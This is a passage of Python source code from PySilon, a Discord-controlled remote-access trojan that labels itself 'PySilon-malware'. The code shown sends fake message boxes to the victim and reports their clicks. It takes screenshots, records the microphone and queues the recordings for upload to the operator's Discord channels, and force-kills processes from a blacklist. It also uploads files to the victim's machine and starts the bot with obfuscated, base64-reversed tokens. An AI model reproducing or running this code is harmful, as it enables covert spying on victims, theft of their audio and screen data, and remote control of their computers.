                    embed = discord.Embed(title="📛 Error",description='```Syntax: .msg <text=""> [title=""] [style=]\n  - default title is "From: Someone"\n  - default style is 0. Styles:\n    0 : OK\n    1 : OK | Cancel\n    2 : Abort | Retry | Ignore\n    3 : Yes | No | Cancel\n    4 : Yes | No\n    5 : Retry | Cancel\n    6 : Cancel | Try Again | Continue```', colour=discord.Colour.red())
                    embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                    reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')
                elif 'text="' in message.content:
                    message_title = 'From: Someone'
                    message_style = 0
                    message_text = ''
                    for i in message.content[message.content.find('text="')+6:]:
                        if i != '"': message_text += i
                        else: break
                    if 'title="' in message.content[5:]:
                        message_title = ''
                        for i in message.content[message.content.find('title="')+7:]:
                            if i != '"': message_title += i
                            else: break
                    if 'style=' in message.content[5:]:
                        message_style = int(message.content[message.content.find('style=')+6])
                    if message.content[-2:] == '/s':
                        threading.Thread(target=send_custom_message, args=(message_title, message_text, message_style,)).start()
                        await asyncio.sleep(0.5)
                        ImageGrab.grab(all_screens=True).save(f'C:\\Users\\{getuser()}\\{software_directory_name}\\ss.png')
                        reaction_msg = await message.channel.send(embed=discord.Embed(title=current_time() + ' `[Sent message]`', color=0x0084ff).set_image(url='attachment://ss.png'), file=discord.File(f'C:\\Users\\{getuser()}\\{software_directory_name}\\ss.png'))
                        await reaction_msg.add_reaction('📌')
                        subprocess.run(f'del C:\\Users\\{getuser()}\\{software_directory_name}\\ss.png', shell=True)
                    else:
                        hti = Html2Image()
                        possible_styles = [
                            '<div class="active_button">OK</div>',
                            '<div class="button">Cancel</div><div class="active_button">OK</div>', 
                            '<div class="button">Ignore</div><div class="button">Retry</div><div class="active_button">Abort</div>',
                            '<div class="button">Cancel</div><div class="button">No</div><div class="active_button">Yes</div>',
                            '<div class="button">No</div><div class="active_button">Yes</div>',
                            '<div class="button">Cancel</div><div class="active_button">Retry</div>',
                            '<div class="button">Continue</div><div class="button">Try Again</div><div class="active_button">Cancel</div>'
                        ]
                        hti.screenshot(
                            html_str='''<head><style>body {margin: 0px;}.container {width: 285px;min-height: 100px;background-color: #ffffff;border: 1px solid black;}.title {margin: 8px;width: 85%;font-size: 13.25px;font-family: 'Calibri';float: left;overflow: hidden;white-space: nowrap;text-overflow: ellipsis;}.close {float: right;font-size: 9px;padding: 8px;}.text {margin-left: 10px;margin-top: 20px;margin-bottom: 25px;float: left;inline-size: 90%;word-break: break-all;font-size: 13px;font-family: 'Calibri';}.footer {background-color: #f0f0f0;width: auto;height: 40px;padding-right: 12px;clear: both;}.button {background-color: #e1e1e1;border: 1px solid #adadad;font-size: 13px;font-family: 'Calibri';float: right;padding-top: 2px;padding-bottom: 2px;margin: 5px;margin-top: 10px;width: 70px;text-align: center;}.active_button {background-color: #e1e1e1;border: 2px solid #0078d7;font-size: 13px;font-family: 'Calibri';float: right;padding-top: 2px;padding-bottom: 2px;margin: 5px;margin-top: 10px;width: 70px;text-align: center;}</style></head><body><div class="container"><div class="title">''' + message_title + '''</div><div class="close"><b>&#9587;</b></div><div class="text">''' + message_text + '''</div><div class="footer">''' + possible_styles[int(message_style)] + '''</div></div></body></html>''',
                            size=(500, 300),
                            save_as='image.png'
                        )
                        img = Image.open('image.png')
                        content = img.getbbox()
                        img = img.crop(content)
                        img.save('image.png')
                        file = discord.File('image.png', filename='image.png')
                        embed = discord.Embed(title='Confirm message', description=f'Check if message preview meets your expectations:', colour=discord.Colour.green())
                        embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                        embed.set_image(url='attachment://image.png')
                        embed.set_footer(text='Note: you will see what button did victim click.')
                        reaction_msg = await message.channel.send(file=file, embed=embed); await reaction_msg.add_reaction('✅'); await reaction_msg.add_reaction('🔴')
                        subprocess.run(f'del C:\\Users\\{getuser()}\\{software_directory_name}\\image.png', shell=True)
                        await message.channel.send('```^ React with ✅ to send the message```')
                        custom_message_to_send = [message_title, message_text, message_style]
            elif expectation == 'onefile':
                split_v1 = str(message.attachments).split('filename=\'')[1]
                filename = str(split_v1).split('\' ')[0]
                reaction_msg = await message.channel.send('```This file will be uploaded to  ' + '/'.join(working_directory) + '/' + filename + '  after you react with 📤 to this message, or with 🔴 to cancel this operation```')
                await reaction_msg.add_reaction('📤')
                await reaction_msg.add_reaction('🔴')
                one_file_attachment_message = message
            elif expectation == 'multiplefiles':
                files_to_merge[1].append(message)
def start_recording():
    global files_to_send, channel_ids, send_recordings
    while True:
        if send_recordings:
            recorded_mic = sounddevice.rec(int(120 * 16000), samplerate=16000, channels=1)
            sounddevice.wait()
            try: os.mkdir('rec_')
            except: pass
            record_name = 'rec_\\' + current_time() + '.wav'
            write(record_name, 16000, recorded_mic)
            files_to_send.append([channel_ids['recordings'], '', record_name, True])
        else:
            time.sleep(20)
def check_int(to_check):
    try:
        asd = int(to_check) + 1
        return True
    except: return False
def active_window_process_name():
    try:
        pid = GetWindowThreadProcessId(GetForegroundWindow())
        return(Process(pid[-1]).name())
    except:
        return None
def process_blacklister():
    global embeds_to_send
    while True:
        if os.path.exists(f'C:/Users/{getuser()}/{software_directory_name}/disabled_processes.psln'):
            with open(f'C:/Users/{getuser()}/{software_directory_name}/disabled_processes.psln', 'r', encoding='utf-8') as disabled_processes:
                process_blacklist = disabled_processes.readlines()
            for x, y in enumerate(process_blacklist): process_blacklist[x] = y.replace('\n', '')
            for process in process_blacklist:
                if process.lower() in [proc.name().lower() for proc in process_iter()]:
                    stdout = force_decode(subprocess.run(f'taskkill /f /IM {process} /t', capture_output=True, shell=True).stdout).strip()
                    time.sleep(1)
                    if process.lower() not in [proc.name().lower() for proc in process_iter()]:
                        embed = discord.Embed(title="🟢 Success", description=f'```Process Blacklister killed {process}```', colour=discord.Colour.green())
                        embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                        embeds_to_send.append([channel_ids['main'], embed])
                    else:
                        embed = discord.Embed(title="📛 Error",description=f'```Process Blacklister tried to kill {process} but it\'s still running...```', colour=discord.Colour.red())
                        embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                        embeds_to_send.append([channel_ids['main'], embed])
        time.sleep(1)
def send_custom_message(title, text, style):
    response = ctypes.windll.user32.MessageBoxW(0, text, title, style)
    possible_responses = [
        '',
        'OK',
        'Cancel',
        'Abort',
        'Retry',
        'Ignore',
        'Yes',
        'No',
        '',
        '',
        'Try Again',
        'Continue'
    ]
    embed = discord.Embed(title="📧 User responded!",description=f'The response for Message(title="{title}", text="{text}", style={style})\nis:```{possible_responses[int(response)]}```', colour=discord.Colour.green())
    embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
    embeds_to_send.append([channel_ids['main'], embed])
for token in bot_tokens:
    decoded_token = base64.b64decode(token[::-1]).decode()
    try:
        client.run(decoded_token)
    except: pass
